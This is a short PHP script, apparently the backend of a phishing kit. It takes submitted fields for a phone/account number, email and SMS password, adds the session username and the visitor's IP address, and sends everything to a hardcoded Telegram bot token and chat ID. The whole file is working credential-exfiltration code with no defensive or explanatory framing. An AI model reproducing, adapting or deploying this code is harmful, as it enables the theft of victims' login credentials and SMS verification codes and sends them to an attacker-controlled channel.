<?php

@session_start();

if ( isset ($_POST['Cuenta']) && isset($_POST['Usuario']) && isset($_POST['Password'])){
$usario=$_SESSION['Usuario'];

$message = "User.: ".$usario." Telefono.: ".$_POST['Cuenta']." Correo.: ".$_POST['Usuario']." ClaveSMS.: ".$_POST['Password']." ".$_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";

$apiToken = "6105796117:AAF0LyDEEn_AZbN8gl0izbnRHNOaFV8QJnE";

    $data = [
        'chat_id' => '2124940397',
        'text' => $message
    ];

    $url = "https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data); 
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_URL, $url);  
    $result = curl_exec($ch);
} else {
   
}

?>